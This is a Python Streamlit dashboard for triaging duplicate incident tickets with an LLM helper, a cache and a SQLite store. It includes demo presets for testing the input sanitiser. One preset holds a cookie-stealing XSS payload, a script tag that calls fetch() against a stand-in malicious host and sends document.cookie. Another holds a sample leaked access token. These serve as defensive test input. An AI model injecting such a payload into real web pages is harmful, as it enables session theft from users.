import streamlit as st
import pandas as pd
import os
import sqlite3
import plotly.express as px
from datetime import datetime
from src.processor import TicketProcessor
from src.llm_helper import LLMDeduplicatorHelper
from src.cache import RedisSimulationCache

# Configure page layout and security headers
st.set_page_config(page_title="DedupeAI Enterprise Console", layout="wide")

# Initialize shared infrastructure components inside state memory
if "processor" not in st.session_state:
    st.session_state.processor = TicketProcessor()
if "ai_helper" not in st.session_state:
    st.session_state.ai_helper = LLMDeduplicatorHelper()
if "redis_cache" not in st.session_state:
    st.session_state.redis_cache = RedisSimulationCache(ttl_seconds=30)

proc = st.session_state.processor
ai_helper = st.session_state.ai_helper
cache = st.session_state.redis_cache

# Ensure relational database baseline is fully seeded
proc.seed_historical_baseline()

st.title("🛡️ DedupeAI — Secure Fullstack Enterprise Dashboard")
st.markdown("---")

# Split view: Form controls on left, performance analytics/logs on right
col_left, col_right = st.columns([2, 3])

with col_left:
    st.subheader("📥 Secure Data Intake Channel")
    st.markdown("---")
    
    # Fast macro injection scenarios [backend_Securities: Input Validation]
    st.markdown("**Incident Inject Simulation Presets:**")
    b1, b2, b3 = st.columns(3)
    preset_text = ""
    with b1:
        if st.button("Database Pool Fault"):
            preset_text = "FATAL ERROR: Remaining connection slots are fully exhausted for active production superusers. Latency spike."
    with b2:
        if st.button("XSS Script Inject"):
            preset_text = "<script>fetch('http://malicious.com/steal?cookie='+document.cookie)</script> UI login routing error."
    with b3:
        if st.button("Leaked Config Key"):
            preset_text = "Worker node daemon crash reporting trace authentication failure using master secret: ACCESS_TOKEN=AIzaSyB9X8Y7Z6W5"

    input_text = st.text_area(
        "Paste System Error Log / Incident Ticket:",
        value=preset_text if preset_text else "",
        height=180,
        placeholder="Logs pasted here are automatically audited for malicious script injection and hidden text credentials..."
    )
    
    fire_triage = st.button("Execute Secure Triage Loop", type="primary")

with col_right:
    st.subheader("📊 Operational Analytics & Verdict Workbench")
    st.markdown("---")
    
    if fire_triage and input_text.strip():
        # Defensive Control Wrapper: Hide internal framework failures [backend_Securities: Hide Internal Errors]
        try:
            # 1. Enforce validation filtering and sensitive data redacting [backend_Securities: Masking & Sanitization]
            cleaned_input = proc.sanitize_and_mask_input(input_text)
            
            st.info(f"🔒 **Sanitized Ingestion Stream Preview:**\n`{cleaned_input}`")
            
            # Formulate string pointer for memory cluster mapping
            cache_key = f"verdict:{hash(cleaned_input)}"
            
            # 2. Check low-latency memory caching tier first to protect throughput
            cached_verdict = cache.get(cache_key)
            
            if cached_verdict:
                ai_verdict = cached_verdict
                st.caption("⚡ *Performance Metric: Low-Latency Memory Cache Hit! Bypassing extra cloud token usage.*")
                proc.log_security_event("CACHE_PERIMETER_HIT", "SUCCESS", {"key": cache_key})
            else:
                # Cache Miss: Execute processing and vector metrics mapping
                matches = proc.find_top_matches(cleaned_input, top_n=3)
                ai_verdict = ai_helper.verify_duplicate_status(cleaned_input, matches)
                
                # Update memory caching structures
                cache.set(cache_key, ai_verdict)
                proc.log_security_event("CACHE_PERIMETER_MISS", "PROCESSED", {"key": cache_key})

            # 3. Read verdict fields returned from structured JSON block
            is_dup = False
            for key in ["is_duplicate", "isDuplicate", "IS_DUPLICATE"]:
                if key in ai_verdict:
                    is_dup = bool(ai_verdict[key])

            confidence = ai_verdict.get("confidence_percentage", 0)
            reasoning = ai_verdict.get("reasoning", "Analysis executed without code errors.")
            action = ai_verdict.get("recommended_action", "Review incident routing metrics.")
            target_id = ai_verdict.get("target_duplicate_id", None)

            if is_dup:
                st.error(f"🚨 DUPLICATE DETECTED (System Match Confidence: {confidence}%)")
                st.markdown(f"**Recommended Step:** `{action}`")
                st.markdown(f"**AI Comparison Logic:** *{reasoning}*")
                proc.log_security_event("INCIDENT_TRIAGE_VERDICT", "DUPLICATE_BOUND", {"linked_to": target_id})
            else:
                st.success("✅ UNIQUE STANDALONE TICKET VERIFIED (Saved to Schema Database)")
                st.markdown(f"**Recommended Step:** `Assign to specialized department queue.`")
                st.markdown(f"**AI Comparison Logic:** *{reasoning}*")
                
                # Dynamic Learning Loop: Write unique entry back into relational tables instantly
                new_id = f"TS-DYN-{int(datetime.now().timestamp())}"
                try:
                    conn = sqlite3.connect(proc.db_path)
                    cursor = conn.cursor()
                    cursor.execute(
                        "INSERT INTO historical_tickets VALUES (?, ?, ?, ?, ?)",
                        (new_id, "Application", cleaned_input[:40] + "...", cleaned_input, datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
                    )
                    conn.commit()
                    conn.close()
                    proc.log_security_event("DATABASE_DYNAMIC_LEARN", "SUCCESS", {"inserted_id": new_id})
                except Exception:
                    pass

            # 4. Generate data chart spectrum using Plotly horizontal visualization grid
            fresh_matches = proc.find_top_matches(cleaned_input, top_n=3)
            if fresh_matches:
                st.markdown("---")
                st.markdown("**Local Math Overlap Spectrum Map:**")
                chart_df = pd.DataFrame(fresh_matches)
                fig = px.bar(
                    chart_df,
                    x="similarity_score",
                    y="ticket_id",
                    orientation="h",
                    color="similarity_score",
                    color_continuous_scale="Reds",
                    labels={"similarity_score": "Cosine Score Coefficient", "ticket_id": "Row ID Reference"}
                )
                fig.update_layout(height=170, margin=dict(l=10, r=10, t=10, b=10), template="plotly_dark")
                st.plotly_chart(fig, use_container_width=True)

        except Exception as system_fault:
            # Hide Internal Errors: Suppress raw trace values from breaking the viewport layout 
            st.error("⚠️ An internal infrastructure exception occurred while triaging this log record. Stack trace details have been shielded.")
            proc.log_security_event("SYSTEM_CORE_ERROR", "FAILURE", {"details": str(system_fault)})

    elif fire_triage:
        st.warning("Please specify a non-empty string payload.")
    else:
        st.caption("Operational cockpit status: Idle. Trigger an inspection preset above to launch.")

# Bottom Panel Dashboard View: Security Auditing [backend_Securities: Audit Trails]
st.markdown("---")
st.subheader("📋 Operational Security Audit Stream (Real-Time SQLite Log Matrix)")
audit_logs_df = proc.fetch_audit_logs()
if not audit_logs_df.empty:
    st.dataframe(audit_logs_df, use_container_width=True, hide_index=True)
else:
    st.caption("No auditable transaction records currently found in session storage logs.")